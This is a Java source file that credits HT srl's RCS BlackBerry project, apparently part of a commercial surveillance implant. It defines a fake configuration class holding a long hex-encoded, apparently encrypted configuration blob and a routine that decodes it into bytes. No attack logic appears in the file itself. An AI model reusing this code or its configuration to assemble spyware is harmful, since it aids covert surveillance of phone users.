//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package fake;

import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;

public class InstanceConfigFake {
    //#ifdef FAKECONF
     
    //polluce 1
    //824
    static String configString = "00000000000000001677e4ca16ebd189dd9be390535196a1f7c1cb135f770d29c444e121a3351c468a300c7dbef1383e7dbd3f1dfd6b70571682f8853aababd8107192e908692aa83ef251c507ee7c1bfced232c30b34ecc5952f2651194b2873dbcb1bec38973f5a58232a67b72224eaeb147abb054b1ed99d0211da6ceb5a86c657cfb78fbc29203d72fc0d53220a90a987f49f32679b6e5803c84a358882e7dd32dba9039cd849d275408f69f77cb3d530ea1dd691fac458748ff7b377a7faeabf4c47c2f8a5a842e0689f5678a3df93c0ba210a8f6317eae9b0098e336f4476dff3abe24af688782092f49a3135044eec85a9f61dda936592af8d347b4f670dcbf27a975b83c8daaa26b82710146bcc2b7d418bff7985bfaf2b68e60f4cfe2d60cf537cf1ddc0523eca2b542f428263186dd481a78215add86586b3872d9daae10e65dc81a324cdff9f893f9145c903a0a42f3c3b75eb229a2c0773a9f10753e1afe37deeab0c79e7b6a2fc12cac07c7b50275df68c31228b3f489da8c386be311ca11d311b78009e1244df62c93e2f6d6cc223b422b518909a2d3bf0760c55995babebe5ebe1c53c2ff70c820fac63cbaf28a1923a99555d73b9e0fa1a42cfc1290ea95f927cab0d75fc046f004efe129919d1181bac33643d0ced8a8bd4dadb39033d63d670e147f5abce355fe2f8b0b9777739f3d57e00dbab5ccf9620d45d548c3cb683931585854ffc5959127bee2d949def97160c1aebb55f55c7f04ecd99250603ef5a935dbc42dbda17dc07c2d734193182f4bd3166aa162e06a5168a294d1a2c73df59bca1dcb6cf3ae34326ce8d240e3538d8b619d70c5d2cd84ecf6c37a3b6a69d13e5d97c7f25dd2736c954e0bc4ff95";
    static byte[] config;
    
    public int version = 2;

    public static byte[] getBytes() {        
        config = hexStringToByteArray(configString);        
        return config;
    }
    
    /**
     * Hex string to byte array.
     * 
     * @param wchar
     *            the wchar
     * @return the byte[]
     */
    public static byte[] hexStringToByteArray(final String config) {
        int offset = 4;
        int len = config.length() / 2;
        final byte[] ret = new byte[ len + 4];

        for (int i = offset; i < ret.length; i++) {
            final char first = config.charAt((i - offset) * 2);
            final char second = config.charAt((i - offset) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }
        
        final DataBuffer databuffer = new DataBuffer(ret, 0, 4, false);
        databuffer.writeInt(len);

        return ret;
    }
    
    //#else
    public static byte[] getBytes() {        
        return null;
    }
  //#endif
}

